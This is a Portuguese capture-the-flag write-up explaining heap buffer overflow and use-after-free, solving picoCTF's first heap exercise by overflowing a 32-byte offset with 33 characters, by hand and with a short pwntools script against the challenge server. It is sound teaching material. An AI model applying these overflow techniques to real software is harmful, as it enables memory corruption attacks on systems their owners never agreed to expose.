## Autor: Gebra  
  
# Heap:

A Heap é uma área da memória dinâmica(RAM) usada por programas para alocar e desalocar dados de forma flexível durante a
execução do código. E vamos explorar as seguintes vulnerabilidades: 

1.Buffer Overflow: Ultrapassar o tamanho alocado de memória em uma variável para alterar memória adjacente. 

2.UAF(Use After Free): Programa Acessa bloco de memória já liberado, permitindo a modificação dos dados.

## Exercício 0:
### Resolução via terminal:
Esse exercício foi projetado para ser de estágio inicial, por isso a Heap pode ser visualizada dentro do próprio código.
```python
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
```

Executando o código, é possivel descobrir os endereços de cada variável na heap.

![image](https://github.com/user-attachments/assets/655c496d-9e70-4afd-9f06-bb07769e6609)


Com esses dados, podemos verificar as distância entre os endereços e conseguir o offset dos dois, assim descobrimos que é 
32 bytes e que precisamos fazer um estouro desse tamanho.
Digitando esse comando no cmd, você receba a string de 33 caracteres pronta para teste.
    
    python3 -c 'print("a"*33)'

Colocando essa string como input do buffer você irá sobrescrever "pico" por "a"*32 e "bico" por "a". 
![image](https://github.com/user-attachments/assets/0c9ee24a-26aa-453a-9832-a249eb25d012)


Assim você consegue a flag ao digitar 4.

### Resolução via pwntools:
![image](https://github.com/user-attachments/assets/a63b90a8-f8c8-4770-8b1f-8519f5ac2077)


Criamos p como process para teste e depois partimos para o remote onde conseguiremos a flag verdadeira.
```python
    p = remote("tethys.picoctf.net", 55850)
```
Depois Criamos um payload para enviar para o código.
```python
    payload = "a" * 33
```
Depois enviamos o payload para o código e recebemos a flag.
```python
    p.recvuntil("choice:")

    p.sendline("2")
    p.sendline(payload)
    
    p.recvuntil("choice:")
    p.sendline("4")

    print(p.recvall())
```


## Exercício 1:
Para o restante dos exercícios vou explicar apenas pelo pwntools para acostumarmos com essa ferramenta.

